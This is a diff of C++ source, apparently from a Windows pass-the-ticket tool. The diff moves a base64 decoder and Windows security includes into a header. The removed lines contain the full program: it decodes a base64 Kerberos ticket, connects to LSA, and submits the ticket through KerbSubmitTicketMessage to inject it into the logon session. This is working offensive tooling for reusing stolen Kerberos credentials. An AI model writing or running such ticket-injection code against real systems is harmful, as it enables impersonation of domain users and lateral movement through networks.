@@ -1,78 +1,69 @@
-#include "stuff.h"
+#pragma once
+#define WIN32_NO_STATUS
+#define SECURITY_WIN32
+#include <windows.h>
+#include <sspi.h>
+#include <NTSecAPI.h>
+#include <ntsecpkg.h>
+#include <iostream>
+#include <string>
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+#pragma comment (lib, "Secur32.lib")
+static char encoding_table[] = { 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
+                                'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
+                                'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
+                                'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
+                                'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
+                                'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
+                                'w', 'x', 'y', 'z', '0', '1', '2', '3',
+                                '4', '5', '6', '7', '8', '9', '+', '/' };
+static char* decoding_table = NULL;
+static int mod_table[] = { 0, 2, 1 };
 
-void usage() {
-	std::cout << "ptt.exe <b64 ticket>" << std::endl;
+void build_decoding_table();
+unsigned char* base64_decode(const char* data, size_t input_length, size_t* output_length);
+void build_decoding_table() {
+
+    decoding_table = (char*)malloc(256);
+    if (decoding_table == NULL) {
+        exit(-1);
+    }
+    for (int i = 0; i < 64; i++) {
+        decoding_table[(unsigned char)encoding_table[i]] = i;
+    }
 }
 
-LSA_STRING* create_lsa_string(const char* value)
-{
-	char* buf = new char[100];
-	LSA_STRING* str = (LSA_STRING*)buf;
-	str->Length = strlen(value);
-	str->MaximumLength = str->Length;
-	str->Buffer = buf + sizeof(LSA_STRING);
-	memcpy(str->Buffer, value, str->Length);
-	return str;
-}
+unsigned char* base64_decode(const char* data, size_t input_length, size_t* output_length) {
 
-int main(int argc, char** argv) {
-	if (argc != 2) {
-		usage();
-		return 1;
-	}
+    if (decoding_table == NULL) build_decoding_table();
 
-	unsigned int kirbiSize;
-	char* ticket = argv[1];
-	unsigned char* kirbiTicket = base64_decode(ticket, strlen(ticket), &kirbiSize);
-	if (kirbiSize == 0) {
-		std::wcout << L"[-] Error converting from b64" << std::endl;
-		return 1;
-	}
-	HANDLE lsa_handle = NULL;
-	NTSTATUS status = LsaConnectUntrusted(&lsa_handle);
-	if (!NT_SUCCESS(status) || !lsa_handle) {
-		std::wcout << L"[-] Error connecting to lsa: " << LsaNtStatusToWinError(status) << std::endl;
-		return 1;
-	}
+    if (input_length % 4 != 0) return NULL;
 
-	PLSA_STRING lsaString = create_lsa_string("kerberos");
+    *output_length = input_length / 4 * 3;
+    if (data[input_length - 1] == '=') {
+        (*output_length)--;
+    }
+    if (data[input_length - 2] == '=') (*output_length)--;
 
-	ULONG authenticationpackage = 0;
-	status = LsaLookupAuthenticationPackage(lsa_handle, lsaString, &authenticationpackage);
-	if (authenticationpackage == 0) {
-		std::wcout << L"[-] Error LsaLookupAP: " << LsaNtStatusToWinError(status) << std::endl;
-		return 1;
-	}
-	std::wcout << L"[?] Package id " << authenticationpackage << std::endl;
+    unsigned char* decoded_data = (unsigned char*)malloc(*output_length);
+    if (decoded_data == NULL) return NULL;
 
-	NTSTATUS packageStatus;
-	DWORD submitSize, responseSize;
-	PKERB_SUBMIT_TKT_REQUEST pKerbSubmit;
-	PVOID dumPtr;
+    for (int i = 0, j = 0; i < input_length;) {
 
-	submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + kirbiSize;
-	if (pKerbSubmit = (PKERB_SUBMIT_TKT_REQUEST)LocalAlloc(LPTR, submitSize))
-	{
-		pKerbSubmit->MessageType = KerbSubmitTicketMessage;
-		pKerbSubmit->KerbCredSize = kirbiSize;
-		pKerbSubmit->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
-		RtlCopyMemory((PBYTE)pKerbSubmit + pKerbSubmit->KerbCredOffset, kirbiTicket, pKerbSubmit->KerbCredSize);
-		status = LsaCallAuthenticationPackage(lsa_handle, authenticationpackage, pKerbSubmit, submitSize, &dumPtr, &responseSize, &packageStatus);
-		if (NT_SUCCESS(status))
-		{
-			if (NT_SUCCESS(packageStatus))
-			{
-				std::wcout << L"[+] Injected\n" << std::endl;
-				status = 0x0;
-			}
-			else if (LsaNtStatusToWinError(packageStatus) == 1398) {
-				std::wcout << L"[!!!!] ERROR_TIME_SKEW between KDC and host computer" << std::endl;
-			}
-			else std::wcout << L"[-] KerbSubmitTicketMessage / Package :" << LsaNtStatusToWinError(packageStatus) << "\n";
-		}
-		else std::wcout << L"[-] KerbSubmitTicketMessage :" << LsaNtStatusToWinError(status) << "\n";
-	}
-	LsaDeregisterLogonProcess(lsa_handle);
+        DWORD sextet_a = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
+        DWORD sextet_b = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
+        DWORD sextet_c = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
+        DWORD sextet_d = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
 
-	return 0;
+        DWORD triple = (sextet_a << 3 * 6)
+            + (sextet_b << 2 * 6)
+            + (sextet_c << 1 * 6)
+            + (sextet_d << 0 * 6);
+
+        if (j < *output_length) decoded_data[j++] = (triple >> 2 * 8) & 0xFF;
+        if (j < *output_length) decoded_data[j++] = (triple >> 1 * 8) & 0xFF;
+        if (j < *output_length) decoded_data[j++] = (triple >> 0 * 8) & 0xFF;
+    }
+
+    return decoded_data;
 }
